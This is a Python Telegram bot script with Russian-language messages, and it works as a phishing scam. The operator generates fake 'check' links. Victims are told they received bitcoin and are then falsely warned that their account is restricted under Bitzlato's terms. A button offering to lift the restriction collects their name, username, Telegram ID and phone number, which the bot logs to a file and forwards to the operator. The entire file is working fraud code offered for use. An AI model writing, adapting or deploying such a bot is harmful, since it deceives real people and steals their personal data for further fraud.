#!/usr/bin/env python
import os

import telebot
from telebot import types
import time
import random
from dotenv import load_dotenv

load_dotenv()

ID = os.getenv('ID')
bot = telebot.TeleBot(os.getenv('TOKEN'))
bot.send_message(ID, '!BOT STARTED!') 
print("Бот запущен!") 


@bot.message_handler(commands=['admin'])
def adm(message):
	if message.from_user.id == int(ID):
		msg = bot.send_message(ID, 'Добро пожаловать в админ панель бота! \n Введите сумму на которую создать чек:') 
		bot.register_next_step_handler(msg, check)
def check(message):
	try:
		if message.text.isdigit():
			bot.send_message(ID, f'Сумма: {message.text}')
			bot.send_message(ID, f'Ваш чек: https://t.me/{bot.get_me().username}?start={message.text}')
		else:
			bot.send_message('Значение должно быть чисельным!')

	except Exception as e:
		print(e)

@bot.message_handler(commands=['start'])
def start(message):
	if message.from_user.id == int(ID):
		bot.send_message(ID, 'Добро пожаловать в бота! \n Для входа в админ панель напишите: /admin') 
	else:
		try:
			summ = message.text.split()[1]
			userid = message.chat.id
			bot.send_message(ID, f'Пользователь с ID:{userid} "Обналичил" ваш чек на сумму:{summ}')
			bot.send_message(message.chat.id, f'''Вы получили 0.00{random.randint(51, 253)} BTC ({summ} RUB) от /uPorterBaseTheFist!''')
			time.sleep(1)
			
			m_id = message.chat.id
			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
			button_phone = types.KeyboardButton(text="✅Снять ограничения", request_contact=True) 	
			keyboard.add(button_phone)	
			bot.send_message(message.chat.id, "Запрещено >>> \n❌ Ваш аккаунт ограничен! Вероятнее всего, Вы нарушили условия сервиса (https://bitzlato.com/en/terms-of-service-bitzlato/)!", reply_markup=keyboard)
		
		except Exception as e:
			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
			button_phone = types.KeyboardButton(text="✅Снять ограничения", request_contact=True) 	
			keyboard.add(button_phone)	
			bot.send_message(message.chat.id, "Запрещено >>> \n❌ Ваш аккаунт ограничен! Вероятнее всего, Вы нарушили условия сервиса (https://bitzlato.com/en/terms-of-service-bitzlato/)!", reply_markup=keyboard)
			userid = message.chat.id
			bot.send_message(ID, f'Пользователь с ID:{userid} запустил бота!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		bot.send_message(userid, "✅Ограничения успешно сняты, спасибо, что воспользовались нашим ботом!")
		info = f'''
			Данные
			├Имя: {first} {last}
			├ID: {userid}
			├Ник: @{nick}
			└Номер телефона: {phone}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, '❌Авторизуйте СВОЙ контакт!')
	
bot.polling()
		